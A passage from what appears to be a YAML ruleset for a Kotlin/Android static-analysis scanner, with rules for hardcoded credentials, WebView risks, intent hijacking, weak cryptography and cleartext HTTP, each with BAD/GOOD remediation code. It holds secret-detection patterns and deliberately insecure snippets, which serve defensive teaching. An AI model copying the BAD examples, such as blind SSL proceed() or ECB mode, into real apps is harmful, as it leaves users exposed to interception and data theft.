- OWASP-A05:Broken-Access-Control
- cloud
rule:
  kind: string_literal
  pattern: AKIA[0-9A-Z]{16}|aws_secret_access_key
note: 'AWS credentials in code can lead to account compromise and financial loss.
  Attackers

  can use exposed credentials to launch resources or access sensitive data.


  REMEDIATION:

  Use AWS Cognito, temporary credentials, or server-side proxy:

  ```kotlin

  // BAD

  val accessKey = "AKIAIOSFODNN7EXAMPLE"

  val secretKey = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"


  // GOOD

  // Use AWS Cognito for temporary credentials

  val credentialsProvider = CognitoCachingCredentialsProvider(...)

  ```


  REFERENCES:

  - CWE-798: https://cwe.mitre.org/data/definitions/798.html

  - AWS Security Best Practices: https://aws.amazon.com/security/

  '
---
id: kotlin-cwe-798-hardcoded-oauth-secret
language: kotlin
severity: error
message: 'CWE-798: Hardcoded OAuth Client Secret'
tags:
- security
- credentials
- CWE-798
- OWASP-A05:Broken-Access-Control
- authentication
rule:
  kind: variable_declaration
  pattern: client_secret\s*=\s*"[^"]+"|oauth.*secret
note: "OAuth client secrets should never be embedded in mobile apps. Extraction of\
  \ secrets\nallows attackers to impersonate the application and access user resources.\n\
  \nREMEDIATION:\nUse PKCE flow for mobile OAuth, avoid client secrets entirely:\n\
  ```kotlin\n// BAD\nval clientSecret = \"my_secret_key_12345\"\n\n// GOOD\n// Use\
  \ PKCE (Proof Key for Public Clients) - no secret needed\nval authRequest = AuthorizationRequest(\n\
  \    clientId = \"your_client_id\",\n    redirectUri = \"com.example.app://oauth\"\
  ,\n    codeChallenge = generateCodeChallenge(codeVerifier),\n    codeChallengeMethod\
  \ = \"S256\"\n)\n```\n\nREFERENCES:\n- CWE-798: https://cwe.mitre.org/data/definitions/798.html\n\
  - OAuth 2.0 for Mobile: https://oauth.net/2/native-apps/\n"
---
id: kotlin-cwe-798-hardcoded-encryption-key
language: kotlin
severity: error
message: 'CWE-798: Hardcoded Encryption Key'
tags:
- security
- credentials
- cryptography
- CWE-798
- OWASP-A05:Broken-Access-Control
rule:
  kind: variable_declaration
  pattern: val.*[Ee]ncryption[Kk]ey.*=.*"[^"]+"
note: "Hardcoded encryption keys can be extracted, rendering encryption useless and\
  \ exposing\nall encrypted data to attackers. This defeats the entire purpose of\
  \ encryption.\n\nREMEDIATION:\nUse Android Keystore to generate and store encryption\
  \ keys:\n```kotlin\n// BAD\nval encryptionKey = \"MySecretKey123456\"\n\n// GOOD\n\
  val keyGenerator = KeyGenerator.getInstance(KeyProperties.KEY_ALGORITHM_AES, \"\
  AndroidKeyStore\")\nkeyGenerator.init(KeyGenParameterSpec.Builder(\n    \"my_key\"\
  ,\n    KeyProperties.PURPOSE_ENCRYPT or KeyProperties.PURPOSE_DECRYPT\n).setBlockModes(KeyProperties.BLOCK_MODE_GCM).build())\n\
  val key = keyGenerator.generateKey()\n```\n\nREFERENCES:\n- CWE-798: https://cwe.mitre.org/data/definitions/798.html\n\
  - Android Cryptography: https://developer.android.com/guide/topics/security/cryptography\n"
---
id: kotlin-cwe-798-hardcoded-bearer-token
language: kotlin
severity: error
message: 'CWE-798: Hardcoded Bearer Token'
tags:
- security
- credentials
- authentication
- CWE-798
- OWASP-A05:Broken-Access-Control
rule:
  kind: string_literal
  pattern: Bearer\s+[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+
note: "Hardcoded JWT tokens expose authentication credentials. Tokens can be extracted\
  \ and\nused to impersonate the legitimate user or service.\n\nREMEDIATION:\nObtain\
  \ tokens dynamically through authentication flow:\n```kotlin\n// BAD\nval token\
  \ = \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0...\"\n\n\
  // GOOD\n// Implement OAuth2/OIDC flow to obtain tokens dynamically\nsuspend fun\
  \ refreshToken(): String {\n    val response = apiClient.refreshToken(currentRefreshToken)\n\
  \    return response.accessToken\n}\n```\n\nREFERENCES:\n- CWE-798: https://cwe.mitre.org/data/definitions/798.html\n\
  - JWT Security: https://jwt.io/introduction\n"
---
id: kotlin-cwe-798-hardcoded-secrets-strings-xml
language: kotlin
severity: error
message: 'CWE-798: Sensitive Data in strings.xml'
tags:
- security
- credentials
- CWE-798
- OWASP-A05:Broken-Access-Control
- android
rule:
  kind: resource_file
  pattern: strings.xml
note: 'secrets in resource files are easily accessible in APK files. Strings can be
  extracted

  directly using standard Android tools like aapt or apktool.


  REMEDIATION:

  Use encrypted storage or server-side configuration:

  ```xml

  <!-- BAD -->

  <string name="api_key">AIzaSyD-abcdefghijklmnop</string>


  <!-- GOOD -->

  <!-- Use BuildConfig or fetch from server -->

  ```


  REFERENCES:

  - CWE-798: https://cwe.mitre.org/data/definitions/798.html

  - MobSF Static Analysis: https://github.com/MobSF/mobsfscan

  '
---
id: kotlin-cwe-798-firebase-config-hardcoded
language: kotlin
severity: warning
message: 'CWE-798: Firebase/Google Services Config Hardcoded'
tags:
- security
- credentials
- CWE-798
- OWASP-A05:Broken-Access-Control
- cloud
rule:
  kind: string_literal
  pattern: firebase.*key|google.*project.*id
note: 'While Firebase keys have some protection through Rules, exposing them enables
  abuse

  by attackers who can forge requests or bypass client-side validation.


  REMEDIATION:

  Use google-services.json and apply app-check/server-side validation:

  ```kotlin

  // BAD

  val firebaseKey = "AIzaSyD-abcdefghijklmnop"


  // GOOD

  // Let Firebase automatically load from google-services.json

  FirebaseApp.initializeApp(context)

  val db = Firebase.firestore

  // Enable App Check in Firebase Console

  ```


  REFERENCES:

  - CWE-798: https://cwe.mitre.org/data/definitions/798.html

  - Firebase Security Rules: https://firebase.google.com/docs/rules

  '
---
id: kotlin-cwe-798-database-connection-string
language: kotlin
severity: error
message: 'CWE-798: Hardcoded Database Connection String'
tags:
- security
- credentials
- CWE-798
- OWASP-A05:Broken-Access-Control
rule:
  kind: string_literal
  pattern: jdbc:.*password=
note: "Database credentials should never be in mobile code. Extracting connection\
  \ strings\nallows attackers to access the entire database directly.\n\nREMEDIATION:\n\
  Use API layer; never connect directly to databases from mobile apps:\n```kotlin\n\
  // BAD\nval connectionString = \"jdbc:mysql://db.example.com:3306/mydb?user=admin&password=secret123\"\
  \n\n// GOOD\n// Connect to your backend API instead\nval apiClient = HttpClient\
  \ {\n    install(JsonFeature)\n}\nval response = apiClient.get(\"https://api.example.com/users/123\"\
  )\n```\n\nREFERENCES:\n- CWE-798: https://cwe.mitre.org/data/definitions/798.html\n\
  - OWASP Mobile Security: https://owasp.org/www-project-mobile-top-10/\n"
---
id: kotlin-cwe-95-webview-javascript-enabled
language: kotlin
severity: warning
message: 'CWE-95: JavaScript Enabled in WebView'
tags:
- security
- injection
- CWE-95
- OWASP-A03:Injection
- android
- webview
rule:
  kind: assignment
  pattern: webView.settings.javaScriptEnabled = true
note: 'JavaScript in WebViews can be exploited for XSS attacks if loading untrusted
  content.

  Each JavaScript-enabled WebView expands the attack surface of the application.


  REMEDIATION:

  Only enable JavaScript when absolutely necessary; validate all loaded URLs:

  ```kotlin

  // RISKY

  webView.settings.javaScriptEnabled = true


  // SAFER

  webView.settings.javaScriptEnabled = false // default - only enable if needed

  ```


  REFERENCES:

  - CWE-95: https://cwe.mitre.org/data/definitions/95.html

  - Android WebView JavaScript: https://detectors.xygeni.io/xydocs/sast/detectors/kotlin/kotlin.android_webview_javascript_enabled.html

  '
---
id: kotlin-cwe-95-addjavascriptinterface-rce
language: kotlin
severity: error
message: 'CWE-95: addJavascriptInterface on API < 17'
tags:
- security
- injection
- CWE-95
- OWASP-A03:Injection
- android
- webview
- code-execution
rule:
  kind: call_expression
  pattern: addJavascriptInterface
note: 'Before API 17, JavaScript could access all public methods via reflection, enabling
  RCE.

  This is a critical vulnerability that allows attackers to call arbitrary Java methods

  from JavaScript context within the WebView.


  REMEDIATION:

  Target API 17+ and use @JavascriptInterface annotation on exposed methods only:

  ```kotlin

  // BAD - exposes all public methods

  webView.addJavascriptInterface(MyJavaClass(), "javaClass")


  // GOOD - only exposes methods with @JavascriptInterface

  @JavascriptInterface

  public fun getSafeData() { ... }

  ```


  REFERENCES:

  - CWE-95: https://cwe.mitre.org/data/definitions/95.html

  - WebView addJavascriptInterface RCE: https://labs.withsecure.com/publications/webview-addjavascriptinterface-remote-code-execution

  '
---
id: kotlin-cwe-95-webview-file-access
language: kotlin
severity: error
message: 'CWE-95: Insecure WebView File Access'
tags:
- security
- CWE-95
- OWASP-A01:Broken-Access-Control
- android
- webview
rule:
  kind: assignment
  pattern: setAllowFileAccess(true)|setAllowFileAccessFromFileURLs(true)
note: 'Allowing JavaScript to access local files enables data theft, arbitrary code
  execution

  through file:// URLs, and access to sensitive application data.


  REMEDIATION:

  Set allowFileAccess and allowFileAccessFromFileURLs to false:

  ```kotlin

  // BAD

  webView.settings.allowFileAccess = true

  webView.settings.allowFileAccessFromFileURLs = true


  // GOOD

  webView.settings.allowFileAccess = false

  webView.settings.allowFileAccessFromFileURLs = false

  webView.settings.allowUniversalAccessFromFileURLs = false

  ```


  REFERENCES:

  - CWE-95: https://cwe.mitre.org/data/definitions/95.html

  - Android WebView File Inclusion: https://developer.android.com/privacy-and-security/risks/webview-unsafe-file-inclusion

  '
---
id: kotlin-cwe-95-webview-loadurl-validation
language: kotlin
severity: error
message: 'CWE-95: WebView Loading Untrusted URLs'
tags:
- security
- injection
- CWE-95
- OWASP-A03:Injection
- android
- webview
rule:
  kind: call_expression
  pattern: loadUrl(\$userInput)
note: "Loading user-controlled URLs can lead to phishing (loading spoofed pages),\n\
  code execution, or navigation to malicious sites.\n\nREMEDIATION:\nWhitelist allowed\
  \ domains; validate URL scheme (HTTPS only):\n```kotlin\n// BAD\nwebView.loadUrl(userProvidedUrl)\n\
  \n// GOOD\nfun loadUrl(url: String) {\n    if (isValidUrl(url)) {\n        webView.loadUrl(url)\n\
  \    }\n}\n\nprivate fun isValidUrl(url: String): Boolean {\n    val uri = Uri.parse(url)\n\
  \    return uri.scheme == \"https\" && ALLOWED_HOSTS.contains(uri.host)\n}\n```\n\
  \nREFERENCES:\n- CWE-95: https://cwe.mitre.org/data/definitions/95.html\n- Android\
  \ Cross-App Scripting: https://developer.android.com/privacy-and-security/risks/cross-app-scripting\n"
---
id: kotlin-cwe-295-ssl-error-handler
language: kotlin
severity: error
message: 'CWE-295: Missing SSL Error Handler / Ignoring SSL Errors'
tags:
- security
- cryptography
- CWE-295
- OWASP-A02:Cryptographic-Failures
- android
- webview
rule:
  kind: method_definition
  pattern: onReceivedSslError.*handler.proceed()
note: "Ignoring SSL errors allows man-in-the-middle attacks. Any handler that calls\
  \ proceed()\non SSL errors bypasses certificate validation entirely.\n\nREMEDIATION:\n\
  Never call proceed() on SSL errors; cancel the request instead:\n```kotlin\n// BAD\
  \ - NEVER DO THIS\noverride fun onReceivedSslError(view: WebView, handler: SslErrorHandler,\
  \ error: SslError) {\n    handler.proceed() // INSECURE!\n}\n\n// GOOD\noverride\
  \ fun onReceivedSslError(view: WebView, handler: SslErrorHandler, error: SslError)\
  \ {\n    handler.cancel()\n    // Show error to user or log for debugging\n}\n```\n\
  \nREFERENCES:\n- CWE-295: https://cwe.mitre.org/data/definitions/295.html\n- Oversecured\
  \ WebView Checklist: https://blog.oversecured.com/Android-security-checklist-webview/\n"
---
id: kotlin-cwe-95-webview-mixed-content
language: kotlin
severity: error
message: 'CWE-95: WebView Mixed Content Mode'
tags:
- security
- CWE-95
- OWASP-A02:Cryptographic-Failures
- android
- webview
rule:
  kind: assignment
  pattern: setMixedContentMode(MIXED_CONTENT_ALWAYS_ALLOW)
note: 'Allowing mixed content enables HTTP resources in HTTPS pages, breaking SSL/TLS
  protection.

  Attackers can downgrade HTTPS connections or inject content via HTTP.


  REMEDIATION:

  Use MIXED_CONTENT_NEVER_ALLOW or MIXED_CONTENT_COMPATIBILITY_MODE:

  ```kotlin

  // BAD

  webView.settings.mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW


  // GOOD

  webView.settings.mixedContentMode = WebSettings.MIXED_CONTENT_NEVER_ALLOW

  ```


  REFERENCES:

  - CWE-95: https://cwe.mitre.org/data/definitions/95.html

  - Android WebView Security: https://developer.android.com/reference/android/webkit/WebSettings

  '
---
id: kotlin-cwe-95-javascript-interface-removal
language: kotlin
severity: warning
message: 'CWE-95: JavaScript Interface Not Removed'
tags:
- security
- injection
- CWE-95
- android
- webview
rule:
  kind: missing_call
  pattern: removeJavascriptInterface
note: "JavaScript interfaces should be removed before loading untrusted content\n\
  to prevent JavaScript from invoking exposed Java methods.\n\nREMEDIATION:\nCall\
  \ removeJavascriptInterface when navigating to untrusted pages:\n```kotlin\n// GOOD\n\
  fun loadUntrustedContent(url: String) {\n    webView.removeJavascriptInterface(\"\
  javaInterface\")\n    webView.loadUrl(url)\n}\n```\n\nREFERENCES:\n- CWE-95: https://cwe.mitre.org/data/definitions/95.html\n\
  - Android WebView Native Bridges: https://developer.android.com/privacy-and-security/risks/insecure-webview-native-bridges\n"
---
id: kotlin-cwe-95-webview-geolocation
language: kotlin
severity: warning
message: 'CWE-95: WebView Geolocation Permission'
tags:
- security
- privacy
- CWE-95
- android
- webview
rule:
  kind: assignment
  pattern: setGeolocationEnabled(true)
note: "Enabling geolocation in WebView allows JavaScript to access device location,\n\
  potentially exposing user location to untrusted web content.\n\nREMEDIATION:\nOnly\
  \ enable for trusted origins; implement proper permission prompts:\n```kotlin\n\
  // GOOD\nwebView.settings.setGeolocationEnabled(false) // default\n\n// If needed,\
  \ handle with custom permission logic\noverride fun onGeolocationPermissionsShowPrompt(origin:\
  \ String?, callback: GeolocationPermissions.Callback) {\n    if (isTrustedOrigin(origin))\
  \ {\n        callback.invoke(origin, true, false)\n    } else {\n        callback.invoke(origin,\
  \ false, false)\n    }\n}\n```\n\nREFERENCES:\n- CWE-95: https://cwe.mitre.org/data/definitions/95.html\n\
  - Android WebView Permissions: https://developer.android.com/reference/android/webkit/WebSettings\n"
---
id: kotlin-cwe-927-implicit-intent-hijacking
language: kotlin
severity: error
message: 'CWE-927: Implicit Intent with Sensitive Data'
tags:
- security
- intent-hijacking
- CWE-927
- OWASP-A01:Broken-Access-Control
- android
rule:
  kind: call_expression
  pattern: Intent().setAction().putExtra()
note: 'Implicit intents can be intercepted by malicious apps registered for the same
  action.

  This allows attackers to receive sensitive data intended for other apps.


  REMEDIATION:

  Use explicit intents with setComponent() or setClass() for sensitive data:

  ```kotlin

  // BAD

  val intent = Intent("com.example.ACTION_SEND_DATA")

  intent.putExtra("password", userPassword)

  startActivity(intent)


  // GOOD

  val intent = Intent(this, TargetActivity::class.java)

  intent.putExtra("password", userPassword)

  startActivity(intent)

  ```


  REFERENCES:

  - CWE-927: https://cwe.mitre.org/data/definitions/927.html

  - Android Implicit Intent Hijacking: https://developer.android.com/privacy-and-security/risks/implicit-intent-hijacking

  '
---
id: kotlin-cwe-927-broadcast-receiver-unprotected
language: kotlin
severity: error
message: 'CWE-927: Exported BroadcastReceiver Without Permission'
tags:
- security
- intent-hijacking
- CWE-927
- OWASP-A01:Broken-Access-Control
- android
rule:
  kind: manifest_element
  pattern: <receiver android:exported="true">
note: "Exported receivers can be invoked by any app, potentially triggering unintended\
  \ actions.\nThis allows any application to send broadcasts to your receiver.\n\n\
  REMEDIATION:\nSet android:exported=\"false\" or require custom permission:\n```xml\n\
  <!-- BAD -->\n<receiver android:name=\".MyReceiver\" android:exported=\"true\" />\n\
  \n<!-- GOOD -->\n<receiver android:name=\".MyReceiver\" android:exported=\"false\"\
  \ />\n\n<!-- Or require permission for sensitive receivers -->\n<receiver android:name=\"\
  .MyReceiver\" android:exported=\"true\"\n    android:permission=\"com.example.MY_CUSTOM_PERMISSION\"\
  \ />\n```\n\nREFERENCES:\n- CWE-927: https://cwe.mitre.org/data/definitions/927.html\n\
  - Android Insecure Broadcast Receivers: https://developer.android.com/privacy-and-security/risks/insecure-broadcast-receiver\n"
---
id: kotlin-cwe-927-sendbroadcast-unprotected
language: kotlin
severity: error
message: 'CWE-927: sendBroadcast Without Permission'
tags:
- security
- intent-hijacking
- CWE-927
- OWASP-A01:Broken-Access-Control
- android
rule:
  kind: call_expression
  pattern: sendBroadcast(intent)
note: 'Broadcasts without permissions can be received by any app. An attacker''s malicious
  app

  can receive broadcasts intended for specific receivers.


  REMEDIATION:

  Use sendBroadcast(intent, permission) or LocalBroadcastManager:

  ```kotlin

  // BAD

  sendBroadcast(intent)


  // GOOD

  sendBroadcast(intent, "com.example.PRIVATE_BROADCAST")


  // Or use LocalBroadcastManager

  LocalBroadcastManager.getInstance(this).sendBroadcast(intent)

  ```


  REFERENCES:

  - CWE-927: https://cwe.mitre.org/data/definitions/927.html

  - CWE-927 Implicit Intent: https://cwe.mitre.org/data/definitions/927.html

  '
---
id: kotlin-cwe-927-pendingintent-mutable
language: kotlin
severity: error
message: 'CWE-927: PendingIntent with FLAG_MUTABLE'
tags:
- security
- intent-hijacking
- CWE-927
- OWASP-A01:Broken-Access-Control
- android
rule:
  kind: call_expression
  pattern: PendingIntent.get.*FLAG_MUTABLE
note: 'Mutable PendingIntents can be modified by receiving apps. Attackers can change
  the intent

  to redirect to malicious components or modify the data.


  REMEDIATION:

  Use FLAG_IMMUTABLE when the Intent doesn''t need modification:

  ```kotlin

  // BAD

  PendingIntent.getActivity(context, 0, intent, PendingIntent.FLAG_MUTABLE)


  // GOOD

  PendingIntent.getActivity(context, 0, intent, PendingIntent.FLAG_IMMUTABLE)

  ```


  REFERENCES:

  - CWE-927: https://cwe.mitre.org/data/definitions/927.html

  - Android PendingIntent Security: https://developer.android.com/guide/components/intents-filters

  '
---
id: kotlin-cwe-927-intent-parsing-validation
language: kotlin
severity: warning
message: 'CWE-927: Intent Parsing Without Validation'
tags:
- security
- intent-hijacking
- CWE-927
- android
rule:
  kind: call_expression
  pattern: intent.getStringExtra()
note: "Intents from external sources should be validated before use. Malicious apps\
  \ can\nsend crafted intents with unexpected data.\n\nREMEDIATION:\nValidate intent\
  \ origin and sanitize extras before processing:\n```kotlin\n// BAD\nval data = intent.getStringExtra(\"\
  user_data\")\nprocessUserData(data)\n\n// GOOD\nval data = intent.getStringExtra(\"\
  user_data\")\nif (isValidInput(data)) {\n    processUserData(data)\n}\n```\n\nREFERENCES:\n\
  - CWE-927: https://cwe.mitre.org/data/definitions/927.html\n- SEI CERT Android:\
  \ https://wiki.sei.cmu.edu/confluence/display/android/\n"
---
id: kotlin-cwe-927-implicit-service-intent
language: kotlin
severity: error
message: 'CWE-927: Implicit Intent for Service Start'
tags:
- security
- intent-hijacking
- CWE-927
- OWASP-A01:Broken-Access-Control
- android
rule:
  kind: call_expression
  pattern: startService(Intent(\$action))
note: 'Services started with implicit intents can be hijacked by malicious apps that

  register for the same action. This allows them to intercept all data.


  REMEDIATION:

  Always use explicit intents for services (required in API 21+):

  ```kotlin

  // BAD

  startService(Intent("com.example.MY_SERVICE"))


  // GOOD

  startService(Intent(this, MyService::class.java))

  ```


  REFERENCES:

  - CWE-927: https://cwe.mitre.org/data/definitions/927.html

  - Android Service Security: https://developer.android.com/guide/components/services

  '
---
id: kotlin-cwe-927-deeplink-validation
language: kotlin
severity: error
message: 'CWE-927: DeepLink Without Validation'
tags:
- security
- intent-hijacking
- CWE-927
- OWASP-A03:Injection
- android
rule:
  kind: call_expression
  pattern: intent.data
note: "Deep links can be crafted by attackers to inject malicious data. Without validation,\n\
  an attacker can navigate users to attacker-controlled content or trigger unintended\
  \ actions.\n\nREMEDIATION:\nValidate scheme, host, and path parameters before processing:\n\
  ```kotlin\n// BAD\nval uri = intent.data\nval userId = uri?.getQueryParameter(\"\
  id\")\nloadUser(userId)\n\n// GOOD\nval uri = intent.data\nif (isValidDeepLink(uri))\
  \ {\n    val userId = uri?.getQueryParameter(\"id\")\n    loadUser(userId)\n}\n\n\
  private fun isValidDeepLink(uri: Uri?): Boolean {\n    return uri?.scheme == \"\
  https\" && uri?.host == \"trusted.example.com\"\n}\n```\n\nREFERENCES:\n- CWE-927:\
  \ https://cwe.mitre.org/data/definitions/927.html\n- Android Deep Link Security:\
  \ https://developer.android.com/training/app-links/verify-android-applinks\n"
---
id: kotlin-cwe-927-intent-redirection
language: kotlin
severity: error
message: 'CWE-927: Intent Redirection Vulnerability'
tags:
- security
- intent-hijacking
- CWE-927
- OWASP-A01:Broken-Access-Control
- android
rule:
  kind: call_expression
  pattern: startActivity(intent.getParcelableExtra)
note: "Using intents received from external sources can lead to intent redirection\
  \ attacks.\nAn attacker can supply an intent that redirects the user to malicious\
  \ components.\n\nREMEDIATION:\nNever start activities with intents received from\
  \ external sources:\n```kotlin\n// BAD\nval redirectIntent = intent.getParcelableExtra<Intent>(\"\
  intent\")\nstartActivity(redirectIntent)\n\n// GOOD\n// Create your own intent based\
  \ on validated data\nval action = intent.getStringExtra(\"action\")\nif (action\
  \ == \"VALID_ACTION\") {\n    val newIntent = Intent(this, ValidActivity::class.java)\n\
  \    startActivity(newIntent)\n}\n```\n\nREFERENCES:\n- CWE-927: https://cwe.mitre.org/data/definitions/927.html\n\
  - Android Intent Vulnerabilities: https://0xn3va.gitbook.io/cheat-sheets/android-application/intent-vulnerabilities\n"
---
id: kotlin-cwe-327-aes-ecb-mode
language: kotlin
severity: error
message: 'CWE-327: AES ECB Mode Usage'
tags:
- security
- cryptography
- CWE-327
- OWASP-A02:Cryptographic-Failures
rule:
  kind: call_expression
  pattern: Cipher.getInstance("AES/ECB/|Cipher.getInstance("AES")
note: 'ECB mode encrypts identical plaintext blocks to identical ciphertext, revealing
  patterns.

  This is considered cryptographically broken and should never be used.


  REMEDIATION:

  Use AES/GCM/NoPadding or AES/CBC with random IV:

  ```kotlin

  // BAD

  val cipher = Cipher.getInstance("AES/ECB/PKCS5Padding")

  // or

  val cipher = Cipher.getInstance("AES") // defaults to ECB


  // GOOD

  val cipher = Cipher.getInstance("AES/GCM/NoPadding")

  ```


  REFERENCES:

  - CWE-327: https://cwe.mitre.org/data/definitions/327.html

  - OWASP Weak Cryptography: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/04-Testing_for_Weak_Encryption

  '
---
id: kotlin-cwe-327-md5-hash
language: kotlin
severity: error
message: 'CWE-327: MD5 Hash Usage'
tags:
- security
- cryptography
- CWE-327
- OWASP-A02:Cryptographic-Failures
rule:
  kind: call_expression
  pattern: MessageDigest.getInstance("MD5")
note: 'MD5 is cryptographically broken; collision attacks are practical and well-documented.

  MD5 should not be used for any security purpose.


  REMEDIATION:

  Use SHA-256 or SHA-3 for hashing:

  ```kotlin

  // BAD

  val md = MessageDigest.getInstance("MD5")


  // GOOD

  val md = MessageDigest.getInstance("SHA-256")

  ```


  REFERENCES:

  - CWE-327: https://cwe.mitre.org/data/definitions/327.html

  - Kotlin Secure Code Wiki: https://securecode.wiki/docs/lang/kotlin/

  '
---
id: kotlin-cwe-327-sha1-hash
language: kotlin
severity: error
message: 'CWE-327: SHA-1 Hash Usage'
tags:
- security
- cryptography
- CWE-327
- OWASP-A02:Cryptographic-Failures
rule:
  kind: call_expression
  pattern: MessageDigest.getInstance("SHA-1")
note: 'SHA-1 is deprecated due to practical collision attacks (SHAttered attack).

  It is no longer suitable for cryptographic purposes.


  REMEDIATION:

  Use SHA-256 or SHA-3:

  ```kotlin

  // BAD

  val md = MessageDigest.getInstance("SHA-1")


  // GOOD

  val md = MessageDigest.getInstance("SHA-256")

  ```


  REFERENCES:

  - CWE-327: https://cwe.mitre.org/data/definitions/327.html

  - MobSF Kotlin Rules: https://github.com/MobSF/mobsfscan/blob/main/mobsfscan/rules/patterns/android/kotlin/kotlin_rules.yaml

  '
---
id: kotlin-cwe-327-des-encryption
language: kotlin
severity: error
message: 'CWE-327: DES/3DES Encryption'
tags:
- security
- cryptography
- CWE-327
- OWASP-A02:Cryptographic-Failures
rule:
  kind: call_expression
  pattern: Cipher.getInstance("DES|Cipher.getInstance("DESede
note: 'DES has 56-bit key which is brute-forceable; 3DES is slow and deprecated.

  Both have been superseded by AES which is faster and more secure.


  REMEDIATION:

  Use AES-256:

  ```kotlin

  // BAD

  val cipher = Cipher.getInstance("DES/CBC/PKCS5Padding")


  // GOOD

  val cipher = Cipher.getInstance("AES/GCM/NoPadding")

  ```


  REFERENCES:

  - CWE-327: https://cwe.mitre.org/data/definitions/327.html

  - NIST Cryptographic Standards: https://csrc.nist.gov/projects/cryptographic-standards-and-guidelines

  '
---
id: kotlin-cwe-327-static-iv
language: kotlin
severity: error
message: 'CWE-327: Static IV for CBC Mode'
tags:
- security
- cryptography
- CWE-327
- OWASP-A02:Cryptographic-Failures
rule:
  kind: object_creation
  pattern: IvParameterSpec(.*constant.*)
note: 'Using static or predictable IVs makes CBC mode vulnerable to attacks. The IV
  must be

  random and unique for each encryption operation.


  REMEDIATION:

  Generate random IV for each encryption operation:

  ```kotlin

  // BAD

  val iv = IvParameterSpec("1234567890123456".toByteArray())


  // GOOD

  val iv = ByteArray(16)

  SecureRandom().nextBytes(iv)

  val ivSpec = IvParameterSpec(iv)

  ```


  REFERENCES:

  - CWE-327: https://cwe.mitre.org/data/definitions/327.html

  - Checkmarx Kotlin SCP: https://github.com/Checkmarx/Kotlin-SCP

  '
---
id: kotlin-cwe-327-weak-rsa-key
language: kotlin
severity: error
message: 'CWE-327: Weak RSA Key Size'
tags:
- security
- cryptography
- CWE-327
- OWASP-A02:Cryptographic-Failures
rule:
  kind: call_expression
  pattern: KeyPairGenerator.*initialize(1024)
note: 'RSA keys under 2048 bits are considered weak and can be brute-forced. NIST
  recommends

  minimum 2048-bit RSA; 4096-bit for long-term security.


  REMEDIATION:

  Use minimum 2048-bit RSA keys; prefer 4096-bit for long-term security:

  ```kotlin

  // BAD

  keyGenerator.initialize(1024)


  // GOOD

  keyGenerator.initialize(2048) // or 4096 for long-term

  ```


  REFERENCES:

  - CWE-327: https://cwe.mitre.org/data/definitions/327.html

  - NIST Key Management Guidelines: https://csrc.nist.gov/publications/detail/sp/800-57-part-1/rev-5/final

  '
---
id: kotlin-cwe-327-weak-pbkdf2
language: kotlin
severity: warning
message: 'CWE-327: Insecure PBKDF2 Iterations'
tags:
- security
- cryptography
- CWE-327
- OWASP-A02:Cryptographic-Failures
rule:
  kind: call_expression
  pattern: PBEKeySpec.*iterations
note: 'Low iteration counts make password hashing vulnerable to brute force attacks.

  Each iteration should take significant time to compute.


  REMEDIATION:

  Use minimum 100,000 iterations for PBKDF2; consider Argon2:

  ```kotlin

  // BAD

  PBEKeySpec(password, salt, 1000, 256)


  // GOOD

  PBEKeySpec(password, salt, 100000, 256)

  // Or better yet, use Argon2

  ```


  REFERENCES:

  - CWE-327: https://cwe.mitre.org/data/definitions/327.html

  - OWASP Password Storage: https://owasp.org/www-project-cheat-sheets/cheatsheets/Password_Storage_Cheat_Sheet.html

  '
---
id: kotlin-cwe-327-null-cipher
language: kotlin
severity: error
message: 'CWE-327: Null Cipher Usage'
tags:
- security
- cryptography
- CWE-327
- OWASP-A02:Cryptographic-Failures
rule:
  kind: object_creation
  pattern: NullCipher()
note: 'NullCipher performs no encryption; data is transmitted in plaintext. This defeats

  the entire purpose of using cryptography.


  REMEDIATION:

  Remove NullCipher; use proper encryption:

  ```kotlin

  // BAD

  val cipher = NullCipher()


  // GOOD

  val cipher = Cipher.getInstance("AES/GCM/NoPadding")

  ```


  REFERENCES:

  - CWE-327: https://cwe.mitre.org/data/definitions/327.html

  - Java Security Documentation: https://docs.oracle.com/javase/8/docs/technotes/guides/security/

  '
---
id: kotlin-cwe-327-no-padding-cipher
language: kotlin
severity: warning
message: 'CWE-327: Insecure Padding with Block Cipher'
tags:
- security
- cryptography
- CWE-327
- OWASP-A02:Cryptographic-Failures
rule:
  kind: call_expression
  pattern: Cipher.getInstance(".*NoPadding")
note: 'NoPadding with block ciphers can leak information about message length.

  GCM mode handles its own padding and is preferred.


  REMEDIATION:

  Use PKCS5Padding for CBC or use GCM mode (which handles padding):

  ```kotlin

  // BAD

  val cipher = Cipher.getInstance("AES/CBC/NoPadding")


  // GOOD

  val cipher = Cipher.getInstance("AES/GCM/NoPadding")

  // or

  val cipher = Cipher.getInstance("AES/CBC/PKCS5Padding")

  ```


  REFERENCES:

  - CWE-327: https://cwe.mitre.org/data/definitions/327.html

  - Baeldung Kotlin AES: https://www.baeldung.com/kotlin/advanced-encryption-standard

  '
---
id: kotlin-cwe-327-platform-default-cipher
language: kotlin
severity: error
message: 'CWE-327: Using Platform Default for Encryption'
tags:
- security
- cryptography
- CWE-327
- OWASP-A02:Cryptographic-Failures
rule:
  kind: call_expression
  pattern: Cipher.getInstance("AES")
note: 'Platform defaults may vary and often default to insecure ECB mode. Always specify

  the full transformation string.


  REMEDIATION:

  Always specify full transformation string: algorithm/mode/padding:

  ```kotlin

  // BAD

  val cipher = Cipher.getInstance("AES")


  // GOOD

  val cipher = Cipher.getInstance("AES/GCM/NoPadding")

  ```


  REFERENCES:

  - CWE-327: https://cwe.mitre.org/data/definitions/327.html

  - GuardRails Kotlin Crypto: https://docs.guardrails.io/docs/vulnerabilities/java/insecure_use_of_crypto

  '
---
id: kotlin-cwe-295-cleartext-http
language: kotlin
severity: error
message: 'CWE-295: Cleartext HTTP Traffic'
tags:
- security
- network
- CWE-295
- OWASP-A02:Cryptographic-Failures
- android
rule:
  kind: string_literal
  pattern: http://|cleartextTrafficPermitted="true"
note: 'HTTP traffic can be intercepted and modified. All network communication should
  use

  HTTPS to ensure confidentiality and integrity.


  REMEDIATION:

  Use HTTPS; set android:usesCleartextTraffic="false" in manifest:

  ```kotlin

  // BAD

  val url = "http://api.example.com/data"


  // GOOD

  val url = "https://api.example.com/data"

  ```


  AndroidManifest.xml:

